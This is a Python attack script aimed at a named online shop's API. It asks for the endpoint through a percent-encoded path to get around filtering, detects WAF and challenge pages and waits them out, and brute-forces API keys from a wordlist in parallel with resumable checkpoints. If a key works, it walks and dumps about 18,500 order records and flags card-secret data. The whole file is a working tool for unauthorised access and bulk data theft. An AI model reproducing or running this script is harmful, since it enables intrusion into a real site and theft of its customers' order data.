#!/usr/bin/env python3
"""fffzz.lol %61pi.php API key brute — resilient: wait-retry, offset, checkpoint, auto-dump."""
import json
import subprocess
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://fffzz.lol/shop/"
API = BASE + "%61pi.php"
OUT = Path(sys.argv[6]) if len(sys.argv) > 6 else Path("/workspace/results/fffzz.lol/kami_allin_20260717")
OUT.mkdir(parents=True, exist_ok=True)
JAR = str(OUT / ".cookies_api2")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HITS = OUT / "KAMI_HIT.jsonl"
FOUND_KEY = OUT / "API_KEY_FOUND.txt"
PROGRESS = OUT / "api_brute_progress.json"
LOCK = threading.Lock()
WID = int(sys.argv[5]) if len(sys.argv) > 5 else 0
LOG = open(OUT / f"api_brute_w{WID}.log", "a", buffering=1)


def log(msg):
    with LOCK:
        line = f"[{datetime.now().strftime('%H:%M:%S')}] w{WID} {msg}"
        print(line, flush=True)
        LOG.write(line + "\n")


def is_waf(body):
    if not body:
        return True
    b = body.lower()
    return any(x in b for x in ("_guard/html.js", "slider_html", "cf-chl", "just a moment", "access denied"))


def is_auth_prompt(body):
    return body and "请提供用户登录信息或API对接密钥" in body


def is_success(body):
    if not body or is_waf(body):
        return False
    if is_auth_prompt(body):
        return False
    if '"code":0' in body:
        return True
    if any(x in body for x in ("kminfo", "卡密", "订单结果", "----")):
        return True
    return False


def curl(url, retry=3, pause=0.4):
    for attempt in range(retry):
        cmd = [
            "curl", "-sk", "--max-time", "15", "-b", JAR, "-c", JAR, "-A", UA,
            "-H", f"Referer: {BASE}", "-H", "X-Requested-With: XMLHttpRequest", url,
        ]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=18).stdout or ""
            if r.strip() and not is_waf(r):
                return r
            if is_waf(r):
                time.sleep(2 + attempt)
        except Exception:
            pass
        time.sleep(pause)
    return ""


def wait_for_site(max_wait=0):
    """Block until api bypass responds. max_wait=0 means forever."""
    start = time.time()
    while True:
        body = curl(f"{API}/?act=search&id=1", retry=2, pause=1)
        if body:
            log(f"site up probe={body[:100]}")
            return body
        log("site down, retry in 30s...")
        if max_wait and time.time() - start > max_wait:
            return ""
        time.sleep(30)


def load_progress():
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text())
        except Exception:
            pass
    return {}


def save_progress(offset, tested):
    data = load_progress()
    data[str(WID)] = {"offset": offset, "tested": tested, "ts": datetime.now().isoformat()}
    PROGRESS.write_text(json.dumps(data, indent=2))


def try_key(key):
    for param in ("key", "api_key", "token", "apikey"):
        url = f"{API}/?act=search&id=1&{param}={quote(key, safe='')}"
        body = curl(url)
        if is_success(body):
            return param, key, body
    return None


def dump_orders(api_key, param="key", max_id=18500, workers=8):
    log(f"DUMP start param={param} key={api_key[:24]}")
    results = []

    def fetch(oid):
        url = f"{API}/?act=search&id={oid}&{param}={quote(api_key, safe='')}"
        body = curl(url)
        if is_success(body):
            return oid, body
        return None

    with ThreadPoolExecutor(workers) as ex:
        futs = {ex.submit(fetch, i): i for i in range(1, max_id + 1)}
        done = 0
        for f in as_completed(futs):
            done += 1
            r = f.result()
            if r:
                oid, body = r
                results.append({"id": oid, "body": body})
                with LOCK:
                    with HITS.open("a") as hf:
                        hf.write(json.dumps({"kind": "api_dump", "id": oid, "resp": body[:2000]}, ensure_ascii=False) + "\n")
                if any(x in body for x in ("kminfo", "卡密", "----")):
                    log(f"*** KAMI id={oid} {body[:120]}")
            if done % 1000 == 0:
                log(f"dump {done}/{max_id} hits={len(results)}")
    (OUT / f"api_orders_dump_w{WID}.json").write_text(json.dumps(results, ensure_ascii=False, indent=2))
    log(f"DUMP done orders={len(results)}")
    return results


def load_keys(wl, start, limit):
    keys = []
    with wl.open(encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f):
            if i < start:
                continue
            if limit and i >= start + limit:
                break
            k = line.strip()
            if 1 <= len(k) <= 128:
                keys.append(k)
    return list(dict.fromkeys(keys))


def main():
    wl = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/data/wordlists/faka-tokens.txt")
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    limit = int(sys.argv[3]) if len(sys.argv) > 3 else 0
    workers = int(sys.argv[4]) if len(sys.argv) > 4 else 20

    prog = load_progress()
    if str(WID) in prog and start == 0:
        start = prog[str(WID)].get("offset", 0)
        log(f"resume from checkpoint offset={start}")

    wait_for_site()
    curl(BASE)

    keys = load_keys(wl, start, limit)
    if WID == 0 and start == 0:
        keys = ["", "fffzz", "admin", "123456", "api", "key", "secret", "test", "fffzzlol"] + keys
        keys = list(dict.fromkeys(keys))
    log(f"brute wl={wl} start={start} limit={limit or 'all'} keys={len(keys)} workers={workers}")

    tested = 0
    batch = 500
    pos = start
    for i in range(0, len(keys), batch):
        chunk = keys[i:i + batch]
        with ThreadPoolExecutor(min(workers, len(chunk))) as ex:
            futs = {ex.submit(try_key, k): k for k in chunk}
            for f in as_completed(futs):
                tested += 1
                pos = start + i + tested
                r = f.result()
                if r:
                    param, key, body = r
                    FOUND_KEY.write_text(f"w{WID} {param}={key}\n{body[:500]}")
                    with HITS.open("a") as hf:
                        hf.write(json.dumps({"kind": "api_key_found", "worker": WID, "param": param, "key": key, "resp": body[:500]}, ensure_ascii=False) + "\n")
                    log(f"*** API KEY FOUND {param}={key} {body[:200]}")
                    dump_orders(key, param)
                    save_progress(pos, tested)
                    return
        if tested % 2000 == 0:
            save_progress(pos, tested)
            log(f"progress tested={tested}/{len(keys)} offset={pos}")
        time.sleep(0.05)

    save_progress(start + len(keys), tested)
    log(f"chunk done tested={tested} no hit")


if __name__ == "__main__":
    main()
